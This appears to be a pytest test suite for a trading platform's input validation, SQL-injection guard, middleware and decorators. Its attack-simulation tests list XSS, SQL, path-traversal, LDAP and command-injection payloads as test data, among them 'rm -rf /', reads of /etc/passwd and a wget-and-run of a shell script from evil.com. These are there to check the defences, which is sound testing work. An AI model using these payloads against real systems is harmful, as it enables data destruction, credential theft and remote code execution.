"""
Comprehensive tests for input validation framework.

Tests all validation components including:
- Input validator utilities
- SQL injection prevention
- Validation middleware
- Validation decorators
- Security attack simulation
"""

import pytest
import asyncio
import json
import time
from unittest.mock import Mock, patch, AsyncMock
from datetime import datetime, date
from decimal import Decimal
from fastapi import HTTPException, Request
from starlette.responses import JSONResponse

# Import validation modules
from alpha_pulse.utils.input_validator import (
    validator, ValidationError, ValidationResult, InputValidator
)
from alpha_pulse.utils.sql_injection_prevention import (
    sql_guard, SQLInjectionError, SQLSecurityViolation, SafeQuery,
    ParameterizedQueryBuilder
)
from alpha_pulse.api.middleware.validation_middleware import (
    ValidationMiddleware, CSRFProtectionMiddleware
)
from alpha_pulse.decorators.validation_decorators import (
    validate_parameters, validate_request_body, validate_financial_data,
    prevent_sql_injection, validate_pagination
)
from alpha_pulse.models.validation_schemas import (
    UserRegistrationRequest, OrderRequest, PortfolioAllocationRequest
)
from alpha_pulse.exceptions.validation_exceptions import (
    ValidationErrorCollection, SecurityValidationError, SQLInjectionError as SQLInjectionException
)


class TestInputValidator:
    """Test input validation utilities."""
    
    def test_string_validation_basic(self):
        """Test basic string validation."""
        # Valid string
        result = validator.validate_string("hello world", min_length=1, max_length=20)
        assert result.is_valid
        assert result.sanitized_value == "hello world"
        
        # Too short
        result = validator.validate_string("hi", min_length=5)
        assert not result.is_valid
        assert "at least 5 characters" in result.errors[0]
        
        # Too long
        result = validator.validate_string("very long string", max_length=5)
        assert not result.is_valid
        assert "at most 5 characters" in result.errors[0]
        
        # Empty when not allowed
        result = validator.validate_string("", allow_empty=False)
        assert not result.is_valid
        assert "cannot be empty" in result.errors[0]
    
    def test_string_validation_security(self):
        """Test string validation with security checks."""
        # XSS attempt
        result = validator.validate_string("<script>alert('xss')</script>")
        assert not result.is_valid
        assert "malicious content" in result.errors[0]
        
        # SQL injection attempt
        result = validator.validate_string("'; DROP TABLE users; --")
        assert not result.is_valid
        assert "malicious SQL content" in result.errors[0]
        
        # Safe string should pass
        result = validator.validate_string("normal safe text")
        assert result.is_valid
    
    def test_email_validation(self):
        """Test email validation."""
        # Valid email
        result = validator.validate_email("user@example.com")
        assert result.is_valid
        assert result.sanitized_value == "user@example.com"
        
        # Invalid email
        result = validator.validate_email("invalid-email")
        assert not result.is_valid
        assert "not a valid email" in result.errors[0]
        
        # Edge cases
        result = validator.validate_email("user+tag@domain.co.uk")
        assert result.is_valid
    
    def test_phone_validation(self):
        """Test phone number validation."""
        # Valid US phone
        result = validator.validate_phone("+1-555-123-4567", region="US")
        assert result.is_valid
        assert result.sanitized_value.startswith("+1")
        
        # Invalid phone
        result = validator.validate_phone("123", region="US")
        assert not result.is_valid
        assert "not a valid phone number" in result.errors[0]
    
    def test_decimal_validation(self):
        """Test decimal/financial value validation."""
        # Valid decimal
        result = validator.validate_decimal("123.45", min_value=Decimal("0"), max_value=Decimal("1000"))
        assert result.is_valid
        assert result.sanitized_value == Decimal("123.45")
        
        # Too many decimal places
        result = validator.validate_decimal("123.123456789", max_decimal_places=4)
        assert not result.is_valid
        assert "decimal places" in result.errors[0]
        
        # Out of range
        result = validator.validate_decimal("1500", max_value=Decimal("1000"))
        assert not result.is_valid
        assert "at most" in result.errors[0]
    
    def test_integer_validation(self):
        """Test integer validation."""
        # Valid integer
        result = validator.validate_integer(42, min_value=0, max_value=100)
        assert result.is_valid
        assert result.sanitized_value == 42
        
        # String integer
        result = validator.validate_integer("123")
        assert result.is_valid
        assert result.sanitized_value == 123
        
        # Invalid integer
        result = validator.validate_integer("12.5")
        assert not result.is_valid
        assert "integer" in result.errors[0]
    
    def test_stock_symbol_validation(self):
        """Test stock symbol validation."""
        # Valid symbols
        result = validator.validate_stock_symbol("AAPL")
        assert result.is_valid
        assert result.sanitized_value == "AAPL"
        
        result = validator.validate_stock_symbol("tsla")
        assert result.is_valid
        assert result.sanitized_value == "TSLA"  # Should be converted to uppercase
        
        # Invalid symbols
        result = validator.validate_stock_symbol("TOOLONG")
        assert not result.is_valid
        
        result = validator.validate_stock_symbol("123")
        assert not result.is_valid
    
    def test_percentage_validation(self):
        """Test percentage validation."""
        # Valid percentages
        result = validator.validate_percentage("50.5")
        assert result.is_valid
        assert result.sanitized_value == Decimal("50.5")
        
        # Invalid percentages
        result = validator.validate_percentage("150")
        assert not result.is_valid
        assert "at most 100" in result.errors[0]
        
        result = validator.validate_percentage("-150")
        assert not result.is_valid
        assert "at least -100" in result.errors[0]
    
    def test_datetime_validation(self):
        """Test datetime validation."""
        # Valid ISO datetime
        result = validator.validate_datetime("2023-12-25T10:30:00")
        assert result.is_valid
        assert isinstance(result.sanitized_value, datetime)
        
        # Valid date only
        result = validator.validate_datetime("2023-12-25")
        assert result.is_valid
        
        # Invalid datetime
        result = validator.validate_datetime("invalid-date")
        assert not result.is_valid
        assert "valid datetime" in result.errors[0]
    
    def test_password_validation(self):
        """Test password strength validation."""
        # Strong password
        result = validator.validate_password("StrongP@ssw0rd!")
        assert result.is_valid
        
        # Weak passwords
        weak_passwords = [
            "weak",  # Too short
            "nouppercase123!",  # No uppercase
            "NOLOWERCASE123!",  # No lowercase
            "NoNumbers!",  # No numbers
            "NoSpecialChars123",  # No special characters
            "password"  # Common password
        ]
        
        for weak_password in weak_passwords:
            result = validator.validate_password(weak_password)
            assert not result.is_valid
    
    def test_file_upload_validation(self):
        """Test file upload validation."""
        # Valid file
        result = validator.validate_file_upload(
            filename="document.pdf",
            content_type="application/pdf",
            file_size=1024 * 1024,  # 1MB
            allowed_extensions=["pdf", "doc"],
            max_size=10 * 1024 * 1024  # 10MB
        )
        assert result.is_valid
        
        # Invalid extension
        result = validator.validate_file_upload(
            filename="script.exe",
            content_type="application/x-executable",
            file_size=1024,
            allowed_extensions=["pdf", "doc"]
        )
        assert not result.is_valid
        assert "not allowed" in result.errors[0]
        
        # File too large
        result = validator.validate_file_upload(
            filename="large.pdf",
            content_type="application/pdf",
            file_size=50 * 1024 * 1024,  # 50MB
            max_size=10 * 1024 * 1024  # 10MB max
        )
        assert not result.is_valid
        assert "exceeds maximum" in result.errors[0]
    
    def test_pagination_validation(self):
        """Test pagination parameter validation."""
        # Valid pagination
        result = validator.validate_pagination(page=1, page_size=20)
        assert result.is_valid
        assert result.sanitized_value == {"page": 1, "page_size": 20}
        
        # Invalid pagination
        result = validator.validate_pagination(page=0, page_size=200, max_page_size=100)
        assert not result.is_valid
        assert len(result.errors) == 2  # Both page and page_size errors


class TestSQLInjectionPrevention:
    """Test SQL injection prevention utilities."""
    
    def test_sql_injection_detection(self):
        """Test SQL injection pattern detection."""
        # Safe queries
        safe_queries = [
            "SELECT * FROM users WHERE id = ?",
            "INSERT INTO trades (symbol, quantity) VALUES (?, ?)",
            "UPDATE portfolio SET balance = ? WHERE user_id = ?"
        ]
        
        for query in safe_queries:
            assert sql_guard.analyze_query(query) is True
        
        # SQL injection attempts
        malicious_queries = [
            "SELECT * FROM users WHERE id = 1; DROP TABLE users; --",
            "SELECT * FROM users WHERE id = 1 OR 1=1",
            "SELECT * FROM users WHERE name = 'admin' AND password = '' OR 1=1 --",
            "SELECT * FROM users; xp_cmdshell('format c:')",
            "SELECT * FROM information_schema.tables"
        ]
        
        for query in malicious_queries:
            with pytest.raises(SQLInjectionError):
                sql_guard.analyze_query(query)
    
    def test_parameter_validation(self):
        """Test SQL parameter validation."""
        # Safe parameters
        safe_params = {
            "user_id": 123,
            "symbol": "AAPL",
            "amount": "100.50"
        }
        
        sql_guard.analyze_query("SELECT * FROM trades WHERE user_id = :user_id", safe_params)
        
        # Malicious parameters
        malicious_params = {
            "user_id": "1; DROP TABLE users; --",
            "symbol": "AAPL' OR 1=1 --"
        }
        
        with pytest.raises(SQLInjectionError):
            sql_guard.analyze_query("SELECT * FROM trades WHERE user_id = :user_id", malicious_params)
    
    def test_raw_sql_blocking(self):
        """Test raw SQL blocking in strict mode."""
        # Enable strict mode
        sql_guard.strict_mode = True
        
        # Raw SQL should be blocked
        with pytest.raises(SQLSecurityViolation):
            sql_guard.validate_raw_sql("SELECT * FROM users")
        
        # Disable strict mode
        sql_guard.strict_mode = False
        
        # Now it should pass
        assert sql_guard.validate_raw_sql("SELECT * FROM users") is True
    
    def test_safe_query_builder(self):
        """Test parameterized query builder."""
        builder = ParameterizedQueryBuilder()
        
        # Build a safe query
        safe_query = (builder
                     .select(["name", "email"], "users")
                     .where("age > :min_age AND status = :status", min_age=18, status="active")
                     .order_by(["name"], "ASC")
                     .limit(10, 0)
                     .build())
        
        assert isinstance(safe_query, SafeQuery)
        assert "SELECT name, email FROM users" in safe_query.query
        assert safe_query.parameters["param_0"] == 18
        assert safe_query.parameters["param_1"] == "active"
        
        # Test identifier validation
        with pytest.raises(ValueError):
            builder.select(["invalid-column"], "users")  # Invalid identifier
        
        with pytest.raises(ValueError):
            builder.select(["SELECT"], "users")  # SQL keyword as identifier


class TestValidationMiddleware:
    """Test validation middleware."""
    
    @pytest.fixture
    def mock_app(self):
        """Mock ASGI application."""
        async def app(scope, receive, send):
            response = JSONResponse({"message": "success"})
            await response(scope, receive, send)
        return app
    
    @pytest.fixture
    def mock_request(self):
        """Mock HTTP request."""
        request = Mock(spec=Request)
        request.url.path = "/api/v1/test"
        request.method = "POST"
        request.query_params = {}
        request.headers = {"content-type": "application/json"}
        request.client.host = "192.168.1.1"
        request.state = Mock()
        return request
    
    @pytest.mark.asyncio
    async def test_validation_middleware_basic(self, mock_app, mock_request):
        """Test basic validation middleware functionality."""
        middleware = ValidationMiddleware(mock_app)
        
        # Mock call_next
        async def call_next(request):
            return JSONResponse({"message": "success"})
        
        # Mock validation rules (empty for this test)
        with patch('alpha_pulse.api.middleware.validation_middleware.get_endpoint_validation_rules') as mock_rules:
            mock_rules.return_value = {}
            
            response = await middleware.dispatch(mock_request, call_next)
            assert response.status_code == 200
    
    @pytest.mark.asyncio
    async def test_request_size_validation(self, mock_app, mock_request):
        """Test request size validation."""
        middleware = ValidationMiddleware(mock_app, max_request_size=1024)
        
        # Set large content length
        mock_request.headers = {"content-length": "2048"}
        
        async def call_next(request):
            return JSONResponse({"message": "success"})
        
        response = await middleware.dispatch(mock_request, call_next)
        assert response.status_code == 400
        assert "too large" in response.body.decode().lower()
    
    @pytest.mark.asyncio
    async def test_csrf_protection_middleware(self, mock_app, mock_request):
        """Test CSRF protection middleware."""
        middleware = CSRFProtectionMiddleware(mock_app, secret_key="test-secret")
        
        # POST request without CSRF token
        mock_request.method = "POST"
        mock_request.headers = {}
        
        async def call_next(request):
            return JSONResponse({"message": "success"})
        
        response = await middleware.dispatch(mock_request, call_next)
        assert response.status_code == 403
        assert "csrf" in response.body.decode().lower()


class TestValidationDecorators:
    """Test validation decorators."""
    
    def test_validate_parameters_decorator(self):
        """Test parameter validation decorator."""
        @validate_parameters(
            symbol={'type': 'stock_symbol', 'required': True},
            quantity={'type': 'integer', 'min_value': 1}
        )
        def place_order(symbol: str, quantity: int):
            return f"Order: {symbol} x {quantity}"
        
        # Valid parameters
        result = place_order(symbol="AAPL", quantity=100)
        assert result == "Order: AAPL x 100"
        
        # Invalid parameters
        with pytest.raises(HTTPException) as exc_info:
            place_order(symbol="INVALID_SYMBOL", quantity=0)
        
        assert exc_info.value.status_code == 400
        assert "validation failed" in str(exc_info.value.detail)
    
    @pytest.mark.asyncio
    async def test_validate_financial_data_decorator(self):
        """Test financial data validation decorator."""
        @validate_financial_data(strict_mode=True)
        async def calculate_portfolio_value(amount: float, percentage: float, symbol: str):
            return amount * (percentage / 100)
        
        # Valid financial data
        result = await calculate_portfolio_value(amount=1000.50, percentage=5.5, symbol="AAPL")
        assert result == 1000.50 * 0.055
        
        # Invalid financial data
        with pytest.raises(HTTPException):
            await calculate_portfolio_value(amount=-1000, percentage=150, symbol="INVALID")
    
    def test_prevent_sql_injection_decorator(self):
        """Test SQL injection prevention decorator."""
        @prevent_sql_injection(allow_raw_sql=False)
        def get_user_data(user_id: str):
            return f"User data for {user_id}"
        
        # Safe input
        result = get_user_data(user_id="123")
        assert result == "User data for 123"
        
        # SQL injection attempt
        with pytest.raises(HTTPException):
            get_user_data(user_id="123; DROP TABLE users; --")
    
    def test_validate_pagination_decorator(self):
        """Test pagination validation decorator."""
        @validate_pagination(max_page_size=50)
        def get_trades(page: int = 1, page_size: int = 20):
            return f"Page {page}, Size {page_size}"
        
        # Valid pagination
        result = get_trades(page=1, page_size=20)
        assert result == "Page 1, Size 20"
        
        # Invalid pagination
        with pytest.raises(HTTPException):
            get_trades(page=0, page_size=100)  # page=0 invalid, page_size=100 > max


class TestValidationSchemas:
    """Test Pydantic validation schemas."""
    
    def test_user_registration_schema(self):
        """Test user registration validation."""
        # Valid registration data
        valid_data = {
            "username": "testuser",
            "email": "test@example.com",
            "password": "StrongP@ssw0rd!",
            "full_name": "Test User",
            "phone": "+1-555-123-4567"
        }
        
        user = UserRegistrationRequest(**valid_data)
        assert user.username == "testuser"
        assert user.email == "test@example.com"
        
        # Invalid registration data
        invalid_data = {
            "username": "tu",  # Too short
            "email": "invalid-email",
            "password": "weak",
            "full_name": ""
        }
        
        with pytest.raises(Exception):  # Pydantic ValidationError
            UserRegistrationRequest(**invalid_data)
    
    def test_order_request_schema(self):
        """Test order request validation."""
        # Valid order data
        valid_data = {
            "symbol": "AAPL",
            "side": "buy",
            "order_type": "limit",
            "quantity": 100,
            "price": "150.25"
        }
        
        order = OrderRequest(**valid_data)
        assert order.symbol == "AAPL"
        assert order.quantity == 100
        
        # Invalid order data
        invalid_data = {
            "symbol": "INVALID_SYMBOL",
            "side": "invalid_side",
            "order_type": "limit",
            "quantity": 0,  # Invalid quantity
            "price": None  # Required for limit orders
        }
        
        with pytest.raises(Exception):
            OrderRequest(**invalid_data)
    
    def test_portfolio_allocation_schema(self):
        """Test portfolio allocation validation."""
        # Valid allocation data
        valid_data = {
            "allocations": {
                "AAPL": "50.0",
                "GOOGL": "30.0",
                "MSFT": "20.0"
            },
            "rebalance_threshold": "5.0"
        }
        
        allocation = PortfolioAllocationRequest(**valid_data)
        assert sum(allocation.allocations.values()) == 100
        
        # Invalid allocation data (doesn't sum to 100%)
        invalid_data = {
            "allocations": {
                "AAPL": "50.0",
                "GOOGL": "30.0"
                # Missing 20% to reach 100%
            }
        }
        
        with pytest.raises(Exception):
            PortfolioAllocationRequest(**invalid_data)


class TestSecurityAttackSimulation:
    """Test validation against various security attacks."""
    
    def test_xss_attack_prevention(self):
        """Test XSS attack prevention."""
        xss_payloads = [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "<img src=x onerror=alert('xss')>",
            "<iframe src='javascript:alert(1)'></iframe>",
            "onmouseover=alert('xss')",
            "<svg onload=alert('xss')>",
            "expression(alert('xss'))"
        ]
        
        for payload in xss_payloads:
            result = validator.validate_string(payload, check_xss=True)
            assert not result.is_valid, f"XSS payload not detected: {payload}"
            assert "malicious content" in result.errors[0]
    
    def test_sql_injection_attack_prevention(self):
        """Test SQL injection attack prevention."""
        sql_payloads = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "admin'--",
            "' UNION SELECT * FROM users --",
            "'; EXEC xp_cmdshell('format c:'); --",
            "1' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 --",
            "' OR 1=1 LIMIT 1 --",
            "1' WAITFOR DELAY '00:00:05' --"
        ]
        
        for payload in sql_payloads:
            result = validator.validate_string(payload, check_sql=True)
            assert not result.is_valid, f"SQL injection payload not detected: {payload}"
            assert "malicious SQL content" in result.errors[0]
    
    def test_path_traversal_prevention(self):
        """Test path traversal attack prevention."""
        path_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd"
        ]
        
        for payload in path_payloads:
            result = validator.validate_string(
                payload, 
                field_name="file_path",
                pattern='safe_path'
            )
            # Should fail safe_path pattern validation
            assert not result.is_valid, f"Path traversal payload not detected: {payload}"
    
    def test_command_injection_prevention(self):
        """Test command injection prevention."""
        command_payloads = [
            "test; rm -rf /",
            "test && cat /etc/passwd",
            "test | nc -l -p 1234",
            "test `whoami`",
            "test $(cat /etc/passwd)",
            "test; wget http://evil.com/shell.sh; sh shell.sh"
        ]
        
        for payload in command_payloads:
            result = validator.validate_string(payload, check_xss=True, check_sql=True)
            # These might not be caught by XSS/SQL checks, but should be caught by pattern validation
            # In a real system, you'd have command injection specific patterns
            if not result.is_valid:
                assert any(error for error in result.errors)
    
    def test_ldap_injection_prevention(self):
        """Test LDAP injection prevention."""
        ldap_payloads = [
            "admin)(|(password=*))",
            "admin)(&(password=*)(|",
            "*)(uid=*))(|(uid=*",
            "admin)(!(&(1=0)))"
        ]
        
        # LDAP injection would be caught by general pattern validation
        for payload in ldap_payloads:
            result = validator.validate_string(payload, pattern='alpha_numeric')
            assert not result.is_valid, f"LDAP injection payload not detected: {payload}"


class TestPerformanceValidation:
    """Test validation performance under load."""
    
    def test_validation_performance(self):
        """Test validation performance with large datasets."""
        start_time = time.time()
        
        # Validate 1000 strings
        for i in range(1000):
            result = validator.validate_string(f"test_string_{i}", min_length=1, max_length=100)
            assert result.is_valid
        
        elapsed = time.time() - start_time
        
        # Should complete 1000 validations in under 1 second
        assert elapsed < 1.0, f"Validation too slow: {elapsed:.3f}s for 1000 validations"
    
    def test_sql_injection_detection_performance(self):
        """Test SQL injection detection performance."""
        start_time = time.time()
        
        # Analyze 100 queries
        for i in range(100):
            sql_guard.analyze_query(f"SELECT * FROM table_{i} WHERE id = ?", {"id": i})
        
        elapsed = time.time() - start_time
        
        # Should complete 100 analyses in under 0.5 seconds
        assert elapsed < 0.5, f"SQL analysis too slow: {elapsed:.3f}s for 100 queries"
    
    def test_concurrent_validation(self):
        """Test concurrent validation performance."""
        import threading
        import queue
        
        results = queue.Queue()
        
        def validate_worker():
            for i in range(100):
                result = validator.validate_string(f"concurrent_test_{i}")
                results.put(result.is_valid)
        
        # Start 10 concurrent threads
        threads = []
        start_time = time.time()
        
        for _ in range(10):
            thread = threading.Thread(target=validate_worker)
            thread.start()
            threads.append(thread)
        
        # Wait for all threads to complete
        for thread in threads:
            thread.join()
        
        elapsed = time.time() - start_time
        
        # Should complete 1000 concurrent validations in under 2 seconds
        assert elapsed < 2.0, f"Concurrent validation too slow: {elapsed:.3f}s"
        
        # Check all validations succeeded
        success_count = 0
        while not results.empty():
            if results.get():
                success_count += 1
        
        assert success_count == 1000, f"Expected 1000 successful validations, got {success_count}"


class TestEdgeCases:
    """Test edge cases and boundary conditions."""
    
    def test_unicode_validation(self):
        """Test validation with Unicode characters."""
        unicode_strings = [
            "Hello 世界",  # Mixed ASCII and Unicode
            "🚀💰📈",  # Emojis
            "Café naïve résumé",  # Accented characters
            "Москва",  # Cyrillic
            "العربية",  # Arabic
            "𝕌𝕟𝕚𝕔𝕠𝕕𝕖",  # Mathematical symbols
        ]
        
        for unicode_string in unicode_strings:
            result = validator.validate_string(unicode_string, min_length=1, max_length=100)
            assert result.is_valid, f"Unicode string validation failed: {unicode_string}"
    
    def test_null_and_empty_values(self):
        """Test validation with null and empty values."""
        # Null values
        result = validator.validate_string(None, allow_empty=True)
        assert result.is_valid
        assert result.sanitized_value == ""
        
        # Empty strings
        result = validator.validate_string("", allow_empty=True)
        assert result.is_valid
        
        result = validator.validate_string("", allow_empty=False)
        assert not result.is_valid
        
        # Whitespace-only strings
        result = validator.validate_string("   ", allow_empty=False)
        assert not result.is_valid
    
    def test_extreme_numeric_values(self):
        """Test validation with extreme numeric values."""
        from decimal import Decimal
        
        # Very large numbers
        result = validator.validate_decimal("999999999999999999.99999999")
        assert result.is_valid
        
        # Very small numbers
        result = validator.validate_decimal("0.00000001")
        assert result.is_valid
        
        # Scientific notation
        result = validator.validate_decimal("1.23e10")
        assert result.is_valid
        
        # Infinity and NaN (should be rejected)
        result = validator.validate_decimal("inf")
        assert not result.is_valid
        
        result = validator.validate_decimal("nan")
        assert not result.is_valid
    
    def test_malformed_data_types(self):
        """Test validation with malformed data types."""
        # Non-string input to string validator
        result = validator.validate_string(123)
        assert not result.is_valid
        
        # Non-numeric input to decimal validator
        result = validator.validate_decimal("not-a-number")
        assert not result.is_valid
        
        # Invalid datetime formats
        invalid_dates = [
            "2023-13-01",  # Invalid month
            "2023-02-30",  # Invalid day
            "2023-02-01T25:00:00",  # Invalid hour
            "not-a-date"
        ]
        
        for invalid_date in invalid_dates:
            result = validator.validate_datetime(invalid_date)
            assert not result.is_valid, f"Invalid date not caught: {invalid_date}"


# Integration tests
class TestIntegration:
    """Test integration between validation components."""
    
    @pytest.mark.asyncio
    async def test_end_to_end_validation(self):
        """Test end-to-end validation flow."""
        # Simulate a complete request validation flow
        
        # 1. Input validation
        user_input = {
            "username": "testuser",
            "email": "test@example.com",
            "password": "StrongP@ssw0rd!",
            "amount": "1000.50",
            "symbol": "AAPL"
        }
        
        # 2. Individual field validation
        username_result = validator.validate_string(
            user_input["username"], 
            min_length=3, 
            max_length=50,
            pattern="alpha_numeric"
        )
        assert username_result.is_valid
        
        email_result = validator.validate_email(user_input["email"])
        assert email_result.is_valid
        
        password_result = validator.validate_password(user_input["password"])
        assert password_result.is_valid
        
        amount_result = validator.validate_decimal(user_input["amount"])
        assert amount_result.is_valid
        
        symbol_result = validator.validate_stock_symbol(user_input["symbol"])
        assert symbol_result.is_valid
        
        # 3. SQL injection check for all string inputs
        for key, value in user_input.items():
            if isinstance(value, str) and key != "password":  # Don't check password for SQL patterns
                sql_result = sql_guard.analyze_query(value)
                assert sql_result is True
        
        # 4. Combined validation using error collection
        error_collection = ValidationErrorCollection()
        
        if not username_result.is_valid:
            error_collection.add_field_error("username", "; ".join(username_result.errors))
        
        if not email_result.is_valid:
            error_collection.add_field_error("email", "; ".join(email_result.errors))
        
        # Should have no errors
        assert not error_collection.has_errors()
    
    def test_validation_error_aggregation(self):
        """Test validation error aggregation and reporting."""
        error_collection = ValidationErrorCollection()
        
        # Add various types of errors
        error_collection.add_field_error("username", "Username too short", "ab")
        error_collection.add_security_error("XSS detected", "xss_attack", "comment", "<script>alert(1)</script>")
        error_collection.add_business_error("Insufficient funds", "balance_check", "amount", 1000000)
        
        # Check error aggregation
        assert error_collection.get_error_count() == 3
        assert len(error_collection.get_security_errors()) == 1
        
        field_errors = error_collection.get_field_errors()
        assert "username" in field_errors
        assert "comment" in field_errors
        assert "amount" in field_errors
        
        # Test conversion to HTTP exception
        http_exc = error_collection.to_http_exception()
        assert http_exc.status_code == 403  # Should be 403 due to security error
        
        error_dict = error_collection.to_dict()
        assert error_dict["error_count"] == 3
        assert len(error_dict["security_errors"]) == 1